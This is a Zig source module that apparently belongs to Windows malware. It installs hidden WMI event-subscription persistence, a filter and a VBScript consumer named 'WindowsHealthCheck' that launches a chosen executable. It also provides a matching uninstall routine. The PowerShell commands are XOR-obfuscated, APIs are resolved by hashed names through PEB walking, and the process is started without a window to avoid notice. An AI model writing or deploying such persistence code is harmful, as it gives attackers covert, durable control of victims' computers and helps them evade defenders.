const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const pshell = hash.xorEncrypt("powershell");
    pub const wmi_script = hash.xorEncrypt(" -Command \"$f=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:__EventFilter').CreateInstance();$f.QueryLanguage='WQL';$f.Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System''';$f.Name='WindowsHealthCheck';$f.Put();$c=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:ActiveScriptEventConsumer').CreateInstance();$c.Name='WindowsHealthCheck';$c.ScriptingEngine='VBScript';$c.ScriptText='CreateObject(\\\"WScript.Shell\\\").Run(\\\"");
    pub const wmi_mid = hash.xorEncrypt("\\\",0,False)';$c.Put();$f2=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:__FilterToConsumerBinding').CreateInstance();$f2.Filter=[wmi]'\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\\"WindowsHealthCheck\\\"';$f2.Consumer=[wmi]'\\\\\\\\.\\\\root\\\\subscription:ActiveScriptEventConsumer.Name=\\\"WindowsHealthCheck\\\"';$f2.Put()\"");
    pub const wmi_uninstall = hash.xorEncrypt(" -Command \"Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter 'Name=\\\"WindowsHealthCheck\\\"' | Remove-WmiObject;Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter 'Name=\\\"WindowsHealthCheck\\\"' | Remove-WmiObject;Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter '__Path LIKE \\\"%WindowsHealthCheck%\\\"' | Remove-WmiObject\"");
};

fn loadKernel32() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
}

fn createProcess(cmd: []const u16) bool {
    const kernel32 = loadKernel32() orelse return false;
    const createProc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
    const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(createProc));
    var si: [68]u8 = undefined;
    @memset(&si, 0);
    var pi: [16]u8 = undefined;
    @memset(&pi, 0);
    return CreateProcessW(null, @constCast(@as([*:0]const u16, @ptrCast(cmd.ptr))), null, null, 0, 0x08000000, null, null, @ptrCast(&si), @ptrCast(&pi)) != 0;
}

pub fn install(exe_path: []const u8) bool {
    var tmp_pshell: [E.pshell.len]u8 = undefined;
    var tmp_script: [E.wmi_script.len]u8 = undefined;
    var tmp_mid: [E.wmi_mid.len]u8 = undefined;
    hash.xorDecrypt(&E.pshell, &tmp_pshell);
    hash.xorDecrypt(&E.wmi_script, &tmp_script);
    hash.xorDecrypt(&E.wmi_mid, &tmp_mid);
    var cmd_buf: [8192]u8 = undefined;
    var pos: usize = 0;
    @memcpy(cmd_buf[pos..][0..tmp_pshell.len], &tmp_pshell);
    pos += tmp_pshell.len;
    @memcpy(cmd_buf[pos..][0..tmp_script.len], &tmp_script);
    pos += tmp_script.len;
    @memcpy(cmd_buf[pos..][0..exe_path.len], exe_path);
    pos += exe_path.len;
    @memcpy(cmd_buf[pos..][0..tmp_mid.len], &tmp_mid);
    pos += tmp_mid.len;
    var cmd_wide: [8192]u16 = undefined;
    for (0..pos) |i| cmd_wide[i] = cmd_buf[i];
    cmd_wide[pos] = 0;
    return createProcess(cmd_wide[0..pos]);
}

pub fn uninstall() bool {
    var tmp_pshell: [E.pshell.len]u8 = undefined;
    var tmp_uninst: [E.wmi_uninstall.len]u8 = undefined;
    hash.xorDecrypt(&E.pshell, &tmp_pshell);
    hash.xorDecrypt(&E.wmi_uninstall, &tmp_uninst);
    var cmd_buf: [4096]u8 = undefined;
    var pos: usize = 0;
    @memcpy(cmd_buf[pos..][0..tmp_pshell.len], &tmp_pshell);
    pos += tmp_pshell.len;
    @memcpy(cmd_buf[pos..][0..tmp_uninst.len], &tmp_uninst);
    pos += tmp_uninst.len;
    var cmd_wide: [4096]u16 = undefined;
    for (0..pos) |i| cmd_wide[i] = cmd_buf[i];
    cmd_wide[pos] = 0;
    return createProcess(cmd_wide[0..pos]);
}

test "wmi install returns bool" {
    _ = install("C:\\test.exe");
}

test "wmi uninstall returns bool" {
    _ = uninstall();
}
